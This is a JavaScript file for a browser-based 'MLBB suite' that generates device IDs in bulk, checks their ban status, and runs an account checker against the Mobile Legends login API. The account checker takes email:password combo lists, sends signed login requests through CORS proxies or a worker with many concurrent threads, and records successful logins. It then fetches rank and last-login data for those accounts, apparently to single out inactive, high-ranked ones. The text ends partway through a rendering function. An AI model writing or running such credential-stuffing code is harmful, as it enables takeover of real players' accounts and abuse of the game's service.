/* ASHER — MLBB suite: generator · device check · account check */

(function () {
  'use strict';

  const $ = id => document.getElementById(id);
  const now = () => Date.now();
  const day = 86400 * 1000;

  /* ═══════════ shared ═══════════ */

  const md5 = (function () {
    function safeAdd(x, y) { const l = (x & 0xffff) + (y & 0xffff); return (((x >> 16) + (y >> 16) + (l >> 16)) << 16) | (l & 0xffff); }
    function rotl(x, n) { return (x << n) | (x >>> (32 - n)); }
    function cmn(q, a, b, x, s, t) { return safeAdd(rotl(safeAdd(safeAdd(a, q), safeAdd(x, t)), s), b); }
    function ff(a,b,c,d,x,s,t){ return cmn((b&c)|(~b&d),a,b,x,s,t); }
    function gg(a,b,c,d,x,s,t){ return cmn((b&d)|(c&~d),a,b,x,s,t); }
    function hh(a,b,c,d,x,s,t){ return cmn(b^c^d,a,b,x,s,t); }
    function ii(a,b,c,d,x,s,t){ return cmn(c^(b|~d),a,b,x,s,t); }
    function md5cycle(x,k){
      let [a,b,c,d]=x;
      a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
      a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
      a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
      a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
      a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
      a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
      a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
      a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
      a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
      a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
      a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
      a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
      a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
      a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
      a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
      a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
      x[0]=safeAdd(a,x[0]);x[1]=safeAdd(b,x[1]);x[2]=safeAdd(c,x[2]);x[3]=safeAdd(d,x[3]);
    }
    function md5blk(s){const m=[];for(let i=0;i<64;i+=4)m[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);return m;}
    function md51(s){
      const n=s.length,state=[1732584193,-271733879,-1732584194,271733878];let i;
      for(i=64;i<=n;i+=64)md5cycle(state,md5blk(s.substring(i-64,i)));
      s=s.substring(i-64);
      const tail=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
      for(i=0;i<s.length;i++)tail[i>>2]|=s.charCodeAt(i)<<((i%4)<<3);
      tail[i>>2]|=0x80<<((i%4)<<3);
      if(i>55){md5cycle(state,tail);for(i=0;i<16;i++)tail[i]=0;}
      tail[14]=n*8;md5cycle(state,tail);return state;
    }
    const hexChr='0123456789abcdef'.split('');
    function rhex(n){let s='';for(let j=0;j<4;j++)s+=hexChr[(n>>(j*8+4))&0x0f]+hexChr[(n>>(j*8))&0x0f];return s;}
    function hex(x){return x.map(rhex).join('');}
    function utf8(str){return unescape(encodeURIComponent(str));}
    return s => hex(md51(utf8(s)));
  })();

  function escapeHtml(s) {
    return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
  }

  function toast(msg) {
    let t = document.querySelector('.toast');
    if (!t) {
      t = document.createElement('div');
      t.className = 'toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(t._tm);
    t._tm = setTimeout(() => t.classList.remove('show'), 2200);
  }

  function genDeviceId() {
    const b = new Uint8Array(16);
    crypto.getRandomValues(b);
    return [...b].map(x => x.toString(16).padStart(2, '0')).join('');
  }

  function relayUrl(selectEl, customEl) {
    const kind = selectEl.value;
    const target = 'https://accountmtapi.mobilelegends.com/';
    if (kind === 'custom') {
      const base = (customEl.value || '').trim().replace(/\/+$/, '');
      return base || null;
    }
    if (kind === 'corsproxy') return `https://corsproxy.io/?${encodeURIComponent(target)}`;
    if (kind === 'allorigins') return `https://api.allorigins.win/raw?url=${encodeURIComponent(target)}`;
    return null;
  }

  /* ═══════════ TAB ROUTER ═══════════ */

  document.querySelectorAll('.tab').forEach(t => {
    t.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(x => x.dataset.active = '');
      t.dataset.active = '1';
      document.querySelectorAll('[data-panel]').forEach(p => {
        p.hidden = p.dataset.panel !== t.dataset.tab;
      });
    });
  });

  if ($('year')) $('year').textContent = new Date().getFullYear();

  /* ═══════════ GENERATOR ═══════════ */

  const G = {
    format:  $('g_format'),
    count:   $('g_count'),
    chunk:   $('g_chunk'),
    run:     $('g_run'),
    clear:   $('g_clear'),
    output:  $('g_output'),
    wrap:    $('g_outputWrap'),
    label:   $('g_label'),
    copy:    $('g_copy'),
    dl:      $('g_dl'),
    zip:     $('g_zip'),
    files:   $('g_files'),
    filesWrap:$('g_filesWrap'),
    stTotal: $('g_stTotal'),
    stFiles: $('g_stFiles'),
    stPer:   $('g_stPer'),
    stFmt:   $('g_stFmt'),
  };

  const G_STATE = { ids: [], chunks: [], fmt: 'hex32' };

  function gGen(fmt) {
    switch (fmt) {
      case 'hex32':  return genDeviceId();
      case 'hex32u': return genDeviceId().toUpperCase();
      case 'hex16':  return genDeviceId().slice(0, 16);
      case 'dashed': {
        const h = genDeviceId();
        return `${h.slice(0,8)}-${h.slice(8,12)}-${h.slice(12,16)}-${h.slice(16,20)}-${h.slice(20)}`;
      }
      default: return genDeviceId();
    }
  }

  function gSplit(arr, size) {
    if (size <= 0 || size >= arr.length) return [arr];
    const out = [];
    for (let i = 0; i < arr.length; i += size) out.push(arr.slice(i, i + size));
    return out;
  }

  async function gRun() {
    const fmt = G.format.value;
    const total = Math.max(1, Math.min(100000, parseInt(G.count.value, 10) || 0));
    const chunk = Math.max(1, Math.min(10000, parseInt(G.chunk.value, 10) || 0));

    G.run.disabled = true;
    G.run.textContent = 'generating…';
    const t0 = performance.now();

    const ids = new Array(total);
    const BATCH = 5000;
    for (let i = 0; i < total; i += BATCH) {
      const end = Math.min(i + BATCH, total);
      for (let j = i; j < end; j++) ids[j] = gGen(fmt);
      await new Promise(r => setTimeout(r, 0));
      if (total >= 20000) G.run.textContent = `generating ${end.toLocaleString()}/${total.toLocaleString()}…`;
    }

    const chunks = gSplit(ids, chunk);
    G_STATE.ids = ids;
    G_STATE.chunks = chunks;
    G_STATE.fmt = fmt;

    const MAX = 500;
    G.output.textContent = ids.length > MAX
      ? ids.slice(0, MAX).join('\n') + `\n\n… ${ids.length - MAX} more`
      : ids.join('\n');
    G.wrap.hidden = false;

    G.files.innerHTML = '';
    if (chunks.length > 1) {
      const stamp = new Date().toISOString().slice(0, 10);
      chunks.forEach((c, i) => {
        const name = `devices_${fmt}_${stamp}_part${String(i + 1).padStart(3, '0')}.txt`;
        const blob = new Blob([c.join('\n') + '\n'], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const row = document.createElement('div');
        row.className = 'file-item';
        row.innerHTML = `<span class="file-name">${name}</span><span class="file-size">${(blob.size/1024).toFixed(1)} KB</span><a href="${url}" download="${name}">↓</a>`;
        G.files.appendChild(row);
      });
      G.filesWrap.hidden = false;
    } else {
      G.filesWrap.hidden = true;
    }

    const dt = (performance.now() - t0).toFixed(0);
    G.label.textContent = `output · ${total.toLocaleString()} ids · ${dt}ms`;
    G.stTotal.textContent = total.toLocaleString();
    G.stFiles.textContent = chunks.length;
    G.stPer.textContent = chunks[0].length;
    G.stFmt.textContent = fmt;

    G.run.disabled = false;
    G.run.textContent = 'Generate';
    toast(`${total.toLocaleString()} ids generated`);
  }

  G.run.addEventListener('click', gRun);
  G.clear.addEventListener('click', () => {
    G_STATE.ids = []; G_STATE.chunks = [];
    G.output.textContent = '';
    G.wrap.hidden = true;
    G.files.innerHTML = '';
    G.filesWrap.hidden = true;
    G.stTotal.textContent = '0';
    G.stFiles.textContent = '0';
    G.stPer.textContent = '0';
    toast('cleared');
  });
  G.format.addEventListener('change', () => G.stFmt.textContent = G.format.value);
  G.count.addEventListener('keydown', e => { if (e.key === 'Enter') gRun(); });

  G.copy.addEventListener('click', async () => {
    if (!G_STATE.ids.length) return;
    try {
      await navigator.clipboard.writeText(G_STATE.ids.join('\n'));
      G.copy.classList.add('ok');
      toast(`copied ${G_STATE.ids.length}`);
      setTimeout(() => G.copy.classList.remove('ok'), 1200);
    } catch { toast('clipboard blocked'); }
  });

  G.dl.addEventListener('click', () => {
    if (!G_STATE.ids.length) return;
    const stamp = new Date().toISOString().slice(0, 10);
    const blob = new Blob([G_STATE.ids.join('\n') + '\n'], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `devices_${G_STATE.fmt}_${stamp}_${G_STATE.ids.length}.txt`;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  G.zip.addEventListener('click', () => {
    if (!G_STATE.chunks.length) return;
    const stamp = new Date().toISOString().slice(0, 10);
    const files = G_STATE.chunks.map((c, i) => ({
      name: `devices_${G_STATE.fmt}_${stamp}_part${String(i + 1).padStart(3, '0')}.txt`,
      content: c.join('\n') + '\n',
    }));
    const zip = buildZip(files);
    const blob = new Blob([zip], { type: 'application/zip' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `devices_${G_STATE.fmt}_${stamp}.zip`;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
  });

  /* buildZip — store-only zip writer (from previous build) */
  function buildZip(files) {
    const enc = new TextEncoder();
    const parts = [], centralDir = [];
    let offset = 0;
    const crcTable = (() => {
      const t = new Uint32Array(256);
      for (let i = 0; i < 256; i++) {
        let c = i;
        for (let k = 0; k < 8; k++) c = (c & 1) ? (0xedb88320 ^ (c >>> 1)) : (c >>> 1);
        t[i] = c >>> 0;
      }
      return t;
    })();
    const crc32 = buf => {
      let c = 0xffffffff;
      for (let i = 0; i < buf.length; i++) c = crcTable[(c ^ buf[i]) & 0xff] ^ (c >>> 8);
      return (c ^ 0xffffffff) >>> 0;
    };
    const u16 = v => [v & 0xff, (v >>> 8) & 0xff];
    const u32 = v => [v & 0xff, (v >>> 8) & 0xff, (v >>> 16) & 0xff, (v >>> 24) & 0xff];
    for (const f of files) {
      const nameBuf = enc.encode(f.name);
      const dataBuf = enc.encode(f.content);
      const crc = crc32(dataBuf);
      const local = [
        ...u32(0x04034b50), ...u16(20), ...u16(0), ...u16(0), ...u16(0), ...u16(0),
        ...u32(crc), ...u32(dataBuf.length), ...u32(dataBuf.length),
        ...u16(nameBuf.length), ...u16(0),
      ];
      const localHeader = new Uint8Array(local);
      parts.push(localHeader, nameBuf, dataBuf);
      const central = [
        ...u32(0x02014b50), ...u16(20), ...u16(20), ...u16(0), ...u16(0), ...u16(0), ...u16(0),
        ...u32(crc), ...u32(dataBuf.length), ...u32(dataBuf.length),
        ...u16(nameBuf.length), ...u16(0), ...u16(0), ...u16(0), ...u16(0),
        ...u32(0), ...u32(offset),
      ];
      centralDir.push({ header: new Uint8Array(central), nameBuf });
      offset += localHeader.length + nameBuf.length + dataBuf.length;
    }
    const cdOffset = offset;
    let cdSize = 0;
    for (const e of centralDir) { parts.push(e.header, e.nameBuf); cdSize += e.header.length + e.nameBuf.length; }
    parts.push(new Uint8Array([
      ...u32(0x06054b50), ...u16(0), ...u16(0),
      ...u16(files.length), ...u16(files.length),
      ...u32(cdSize), ...u32(cdOffset), ...u16(0),
    ]));
    const total = parts.reduce((n, p) => n + p.length, 0);
    const out = new Uint8Array(total);
    let o = 0;
    for (const p of parts) { out.set(p, o); o += p.length; }
    return out;
  }

  /* ═══════════ DEVICE CHECKER ═══════════ */

  const D = {
    mode:    $('d_mode'),
    threads: $('d_threads'),
    delay:   $('d_delay'),
    relay:   $('d_relay'),
    worker:  $('d_worker'),
    pasteRow:$('d_pasteRow'),
    fileRow: $('d_fileRow'),
    input:   $('d_input'),
    file:    $('d_file'),
    run:     $('d_run'),
    stop:    $('d_stop'),
    clear:   $('d_clear'),
    wrap:    $('d_outputWrap'),
    label:   $('d_label'),
    results: $('d_results'),
    copyClean:$('d_copyClean'),
    dlClean: $('d_dlClean'),
    stDone:  $('d_stDone'),
    stTotal: $('d_stTotal'),
    stClean: $('d_stClean'),
    stBan:   $('d_stBan'),
    stBound: $('d_stBound'),
    stFmt:   $('d_stFmt'),
    stErr:   $('d_stErr'),
    stTime:  $('d_stTime'),
    prog:    $('d_prog'),
  };

  const D_STATE = { running: false, aborter: null, stats: {}, results: [], filter: 'all', t0: 0, tm: null };

  const D_STATUS = {
    'Error_Success':       'clean',
    'Error_DeviceBanned':  'banned',
    'Error_DeviceBlack':   'blacklisted',
    'Error_DeviceInUse':   'bound',
    'Error_DeviceInvalid': 'invalid_format',
    'Error_SignError':     'sign_err',
    'Error_TooMany':       'limit',
    'Error_NoDevice':      'unknown_device',
  };

  function dIsValid(id) { return /^[0-9a-f]{32}$/i.test(id) || /^[0-9a-f]{16}$/i.test(id); }

  function dParse(text) {
    const out = [], seen = new Set();
    text.split(/\r?\n/).forEach(line => {
      line = line.trim();
      if (!line || line.startsWith('#')) return;
      line.split(/[,\s]+/).forEach(tok => {
        tok = tok.trim();
        if (tok && !seen.has(tok)) { seen.add(tok); out.push(tok); }
      });
    });
    return out;
  }

  async function dCheckOne(id, workerUrl, signal) {
    if (!dIsValid(id)) {
      return { device_id: id, status: 'invalid_format', message: '', reason: 'not 16/32 hex' };
    }
    const sign = md5(`deviceId=${id}&op=device_login`);
    const body = {
      op: 'device_login',
      sign,
      params: { deviceId: id, gameServerId: '1', channelId: '1' },
      lang: 'cn',
    };
    let res, data;
    try {
      const isWorker = /\.workers\.dev/.test(workerUrl);
      if (isWorker) {
        res = await fetch(workerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ url: 'https://accountmtapi.mobilelegends.com/', payload: body }),
          signal,
        });
      } else {
        res = await fetch(workerUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-Requested-With': 'com.mobile.legends' },
          body: JSON.stringify(body),
          signal,
        });
      }
      const text = await res.text();
      try { data = JSON.parse(text); }
      catch { return { device_id: id, status: 'error', reason: `http ${res.status} non-json`, message: text.slice(0, 60) }; }
    } catch (e) {
      if (e.name === 'AbortError') throw e;
      return { device_id: id, status: 'error', reason: e.message };
    }
    const msg = (data && data.message) || '';
    return { device_id: id, status: D_STATUS[msg] || 'error', message: msg, raw: data };
  }

  function dUpdateStats() {
    const s = D_STATE.stats;
    D.stDone.textContent = (s.done || 0).toLocaleString();
    D.stTotal.textContent = (s.total || 0).toLocaleString();
    D.stClean.textContent = (s.clean || 0).toLocaleString();
    D.stBan.textContent = ((s.banned || 0) + (s.blacklisted || 0)).toLocaleString();
    D.stBound.textContent = (s.bound || 0).toLocaleString();
    D.stFmt.textContent = (s.invalid_format || 0).toLocaleString();
    D.stErr.textContent = ((s.error || 0) + (s.sign_err || 0)).toLocaleString();
    D.prog.style.width = s.total ? (s.done / s.total * 100) + '%' : '0';
  }

  function dRender() {
    const f = D_STATE.filter;
    let rows;
    if (f === 'all') rows = D_STATE.results;
    else if (f === 'banned') rows = D_STATE.results.filter(r => r.status === 'banned' || r.status === 'blacklisted');
    else if (f === 'error') rows = D_STATE.results.filter(r => r.status === 'error' || r.status === 'sign_err');
    else rows = D_STATE.results.filter(r => r.status === f);

    if (!rows.length) {
      D.results.innerHTML = `<div class="empty">no rows for "${f}"</div>`;
      return;
    }
    const frag = document.createDocumentFragment();
    rows.forEach(r => {
      const div = document.createElement('div');
      div.className = `result-row ${r.status}`;
      div.innerHTML = `
        <span class="r-tag ${r.status}">${r.status.replace('_',' ')}</span>
        <span class="r-id">${escapeHtml(r.device_id)}</span>
        <span class="r-msg">${escapeHtml((r.message || r.reason || '').slice(0,40))}</span>
      `;
      frag.appendChild(div);
    });
    D.results.innerHTML = '';
    D.results.appendChild(frag);
  }

  async function dRun() {
    if (D_STATE.running) return;
    const relay = relayUrl(D.relay, D.worker);
    if (!relay) { toast('set a relay URL'); return; }

    let ids;
    if (D.mode.value === 'file' && D.file.files.length) {
      ids = dParse(await D.file.files[0].text());
    } else {
      ids = dParse(D.input.value);
    }
    if (!ids.length) { toast('no device IDs'); return; }

    const threads = Math.max(1, Math.min(30, parseInt(D.threads.value, 10) || 10));
    const delay = Math.max(0, Math.min(5000, parseInt(D.delay.value, 10) || 0));

    D_STATE.running = true;
    D_STATE.aborter = new AbortController();
    D_STATE.stats = { done: 0, total: ids.length, clean: 0, banned: 0, blacklisted: 0,
                      bound: 0, limit: 0, invalid_format: 0, error: 0, sign_err: 0, unknown_device: 0 };
    D_STATE.results = [];
    D_STATE.filter = 'all';
    D_STATE.t0 = now();

    document.querySelectorAll('[data-dfilter]').forEach(b => {
      b.dataset.active = b.dataset.dfilter === 'all' ? '1' : '';
    });

    D.run.disabled = true;
    D.stop.disabled = false;
    D.wrap.hidden = false;
    D.results.innerHTML = `<div class="empty">running…</div>`;
    dUpdateStats();

    D_STATE.tm = setInterval(() => {
      D.stTime.textContent = ((now() - D_STATE.t0) / 1000).toFixed(1) + 's';
    }, 100);

    let next = 0;
    const total = ids.length;

    async function worker() {
      while (D_STATE.running) {
        const i = next++;
        if (i >= total) return;
        const id = ids[i];
        let res;
        try { res = await dCheckOne(id, relay, D_STATE.aborter.signal); }
        catch (e) { if (e.name === 'AbortError') return; res = { device_id: id, status: 'error', reason: e.message }; }
        D_STATE.results.push(res);
        const s = D_STATE.stats;
        s.done++;
        if (res.status in s) s[res.status]++;
        dUpdateStats();
        dRender();
        D.label.textContent = `results · ${s.done}/${total}`;
        if (delay > 0) await new Promise(r => setTimeout(r, delay));
      }
    }

    await Promise.all(Array.from({ length: threads }, () => worker()));

    clearInterval(D_STATE.tm);
    D_STATE.running = false;
    D.run.disabled = false;
    D.stop.disabled = true;
    D.stTime.textContent = ((now() - D_STATE.t0) / 1000).toFixed(1) + 's';
    toast(`done — ${D_STATE.stats.clean} clean / ${D_STATE.stats.total}`);
  }

  function dStop() {
    if (!D_STATE.running) return;
    D_STATE.running = false;
    if (D_STATE.aborter) D_STATE.aborter.abort();
    clearInterval(D_STATE.tm);
    D.run.disabled = false;
    D.stop.disabled = true;
    toast('stopped');
  }

  D.run.addEventListener('click', dRun);
  D.stop.addEventListener('click', dStop);
  D.clear.addEventListener('click', () => {
    dStop();
    D_STATE.results = [];
    D_STATE.stats = {};
    dUpdateStats();
    D.results.innerHTML = '';
    D.wrap.hidden = true;
    D.stTime.textContent = '0.0s';
    toast('cleared');
  });

  D.mode.addEventListener('change', () => {
    const isFile = D.mode.value === 'file';
    D.pasteRow.hidden = isFile;
    D.fileRow.hidden = !isFile;
  });

  document.querySelectorAll('[data-dfilter]').forEach(b => {
    b.addEventListener('click', () => {
      document.querySelectorAll('[data-dfilter]').forEach(x => x.dataset.active = '');
      b.dataset.active = '1';
      D_STATE.filter = b.dataset.dfilter;
      dRender();
    });
  });

  D.copyClean.addEventListener('click', async () => {
    const lines = D_STATE.results.filter(r => r.status === 'clean').map(r => r.device_id);
    if (!lines.length) { toast('no clean'); return; }
    try { await navigator.clipboard.writeText(lines.join('\n')); toast(`copied ${lines.length} clean`); }
    catch { toast('clipboard blocked'); }
  });

  D.dlClean.addEventListener('click', () => {
    const lines = D_STATE.results.filter(r => r.status === 'clean').map(r => r.device_id);
    if (!lines.length) { toast('no clean'); return; }
    const stamp = new Date().toISOString().slice(0, 10);
    const blob = new Blob([lines.join('\n') + '\n'], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `devices_clean_${stamp}.txt`;
    document.body.appendChild(a); a.click(); a.remove();
    setTimeout(() => URL.revokeObjectURL(url), 1000);
    toast(`downloaded ${lines.length} clean`);
  });

  /* ═══════════ ACCOUNT CHECKER ═══════════ */

  const A = {
    mode:    $('a_mode'),
    threads: $('a_threads'),
    delay:   $('a_delay'),
    relay:   $('a_relay'),
    worker:  $('a_worker'),
    pool:    $('a_pool'),
    state:   $('a_state'),
    inactive:$('a_inactive'),
    rankRange:$('a_rankRange'),
    pasteRow:$('a_pasteRow'),
    fileRow: $('a_fileRow'),
    input:   $('a_input'),
    file:    $('a_file'),
    run:     $('a_run'),
    stop:    $('a_stop'),
    clear:   $('a_clear'),
    wrap:    $('a_outputWrap'),
    label:   $('a_label'),
    results: $('a_results'),
    copyHits:$('a_copyHits'),
    dlHits:  $('a_dlHits'),
    stDone:  $('a_stDone'),
    stTotal: $('a_stTotal'),
    stHit:   $('a_stHit'),
    stBan:   $('a_stBan'),
    stWrong: $('a_stWrong'),
    stNoAcc: $('a_stNoAcc'),
    stLimit: $('a_stLimit'),
    stErr:   $('a_stErr'),
    stTime:  $('a_stTime'),
    prog:    $('a_prog'),
  };

  const A_STATE = { running: false, aborter: null, stats: {}, results: [], filter: 'all', t0: 0, tm: null, pool: [] };

  /* Rank tiers — Moonton internal IDs (approximate; refine with live capture) */
  const RANK_TIERS = [
    { id: 0,  name: 'Warrior III' },
    { id: 1,  name: 'Warrior II' },
    { id: 2,  name: 'Warrior I' },
    { id: 3,  name: 'Elite III' },
    { id: 4,  name: 'Elite II' },
    { id: 5,  name: 'Elite I' },
    { id: 6,  name: 'Master III' },
    { id: 7,  name: 'Master II' },
    { id: 8,  name: 'Master I' },
    { id: 9,  name: 'Grandmaster III' },
    { id: 10, name: 'Grandmaster II' },
    { id: 11, name: 'Grandmaster I' },
    { id: 12, name: 'Epic III' },
    { id: 13, name: 'Epic II' },
    { id: 14, name: 'Epic I' },
    { id: 15, name: 'Legend III' },
    { id: 16, name: 'Legend II' },
    { id: 17, name: 'Legend I' },
    { id: 18, name: 'Mythic' },
    { id: 19, name: 'Mythical Honor' },
    { id: 20, name: 'Mythical Glory' },
    { id: 21, name: 'Mythical Immortal' },
  ];

  const RANK_RANGES = {
    'warrior-glory':    [0, 20],
    'warrior-immortal': [0, 21],
    'epic-glory':       [12, 20],
    'legend-glory':     [15, 20],
    'mythic-glory':     [18, 20],
    'any':              [0, 21],
  };

  function rankName(id) {
    if (id == null) return '—';
    const t = RANK_TIERS.find(x => x.id === id);
    return t ? t.name : `tier ${id}`;
  }

  const A_STATUS = {
    'Error_Success':         'hit',
    'Error_PasswdError':     'wrong_pw',
    'Error_NoAccount':       'no_account',
    'Error_PwdErrorTooMany': 'limit',
    'Error_AccountLocked':   'banned',
    'Error_AccountBanned':   'banned',
    'Error_SignError':       'sign_err',
  };

  function aParseCombos(text) {
    const out = [], seen = new Set();
    text.split(/\r?\n/).forEach(line => {
      line = line.trim();
      if (!line || line.startsWith('#')) return;
      for (const sep of [':', '|', ';']) {
        const idx = line.indexOf(sep);
        if (idx > 0) {
          const email = line.slice(0, idx).trim();
          const pw = line.slice(idx + 1).trim();
          if (email && pw) {
            const k = email + '\x00' + pw;
            if (!seen.has(k)) { seen.add(k); out.push([email, pw]); }
          }
          return;
        }
      }
    });
    return out;
  }

  function pickDevice() {
    if (A_STATE.pool.length) return A_STATE.pool[Math.floor(Math.random() * A_STATE.pool.length)];
    return genDeviceId();
  }

  /* Attempt to fetch rank/last-login from the role_list endpoint using session token.
     Note: endpoint/params rotate. ship as best-effort; swap when you capture live traffic.
     Response fields we try to read: rank_tier, last_login, lastLogin, last_active_at. */
  async function aFetchProfile(sid, workerUrl, signal) {
    const raw = `op=role_list&sid=${sid}`;
    const sign = md5(raw);
    const body = { op: 'role_list', sign, params: { sid, gameServerId: '1' }, lang: 'cn' };
    try {
      const isWorker = /\.workers\.dev/.test(workerUrl);
      const res = await fetch(workerUrl, {
        method: 'POST',
        headers: isWorker
          ? { 'Content-Type': 'application/json' }
          : { 'Content-Type': 'application/json', 'X-Requested-With': 'com.mobile.legends' },
        body: isWorker
          ? JSON.stringify({ url: 'https://accountmtapi.mobilelegends.com/', payload: body })
          : JSON.stringify(body),
        signal,
      });
      const data = await res.json();
      const role = data?.data?.roles?.[0] || data?.data || {};
      return {
        rank: role.rank_tier ?? role.rankTier ?? role.rank ?? null,
        last: role.last_login ?? role.lastLogin ?? role.last_active_at ?? role.lastActiveAt ?? null,
      };
    } catch {
      return { rank: null, last: null };
    }
  }

  async function aCheckOne(email, password, workerUrl, signal) {
    const did = pickDevice();
    const md5pwd = md5(password);
    const sign = md5(`account=${email}&deviceId=${did}&md5pwd=${md5pwd}&op=login`);
    const body = {
      op: 'login',
      sign,
      params: { account: email, md5pwd, deviceId: did, gameServerId: '1', channelId: '1' },
      lang: 'cn',
    };

    let data, res;
    try {
      const isWorker = /\.workers\.dev/.test(workerUrl);
      res = await fetch(workerUrl, {
        method: 'POST',
        headers: isWorker
          ? { 'Content-Type': 'application/json' }
          : { 'Content-Type': 'application/json', 'X-Requested-With': 'com.mobile.legends' },
        body: isWorker
          ? JSON.stringify({ url: 'https://accountmtapi.mobilelegends.com/', payload: body })
          : JSON.stringify(body),
        signal,
      });
      const text = await res.text();
      try { data = JSON.parse(text); }
      catch { return { email, password, device_id: did, status: 'error', reason: `http ${res.status} non-json` }; }
    } catch (e) {
      if (e.name === 'AbortError') throw e;
      return { email, password, device_id: did, status: 'error', reason: e.message };
    }

    const msg = (data && data.message) || '';
    const status = A_STATUS[msg] || 'error';
    const inner = data?.data || {};
    const sid = inner.sid || inner.sessionId || inner.token || null;

    const base = {
      email, password, device_id: did, status, message: msg,
      ign:    inner.nickname || inner.name || null,
      region: inner.region   || inner.zoneName || null,
      uid:    inner.uid      || inner.roleId || null,
      rank:   inner.rank_tier ?? inner.rankTier ?? null,
      last:   inner.last_login ?? inner.lastLogin ?? null,
    };

    /* only chase profile if login succeeded */
    if (status === 'hit' && sid) {
      const prof = await aFetchProfile(sid, workerUrl, signal);
      base.rank = base.rank ?? prof.rank;
      base.last = base.last ?? prof.last;
    }
    return base;
  }

  function aInactiveDays(last) {
    if (!last) return null;
    let t;
    if (typeof last === 'number') t = last > 1e12 ? last : last * 1000;
    else t = Date.parse(last);
    if (isNaN(t)) return null;
    return Math.floor((now() - t) / day);
  }

  function aPassesFilters(r) {
    const state = A.state.value;
    if (state === 'live' && r.status !== 'hit') return false;
    if (state === 'banned' && r.status !== 'banned') return false;

    const minInactive = parseInt(A.inactive.value, 10) || 0;
    if (minInactive > 0) {
      const d = aInactiveDays(r.last);
      if (d == null || d < minInactive) return false;
    }

    const range = RANK_RANGES[A.rankRange.value] || [0, 21];
    if (A.rankRange.value !== 'any' && r.status === 'hit') {
      if (r.rank == null) return false;
      if (r.rank < range[0] || r.rank > range[1]) return false;
    }
    return true;
  }

  function aUpdateStats() {
    const s = A_STATE.stats;
    A.stDone.textContent = (s.done || 0).toLocaleString();
    A.stTotal.textContent = (s.total || 0).toLocaleString();
    A.stHit.textContent = (s.hit || 0).toLocaleString();
    A.stBan.textContent = (s.banned || 0).toLocaleString();
    A.stWrong.textContent = (s.wrong_pw || 0).toLocaleString();
    A.stNoAcc.textContent = (s.no_account || 0).toLocaleString();
    A.stLimit.textContent = (s.limit || 0).toLocaleString();
    A.stErr.textContent = ((s.error || 0) + (s.sign_err || 0)).toLocaleString();
    A.prog.style.width = s.total ? (s.done / s.total * 100) + '%' : '0';
  }

  function aRender() {
    const f = A_STATE.filter;
    let rows;
    if (f === 'all') rows = A_STATE.results;
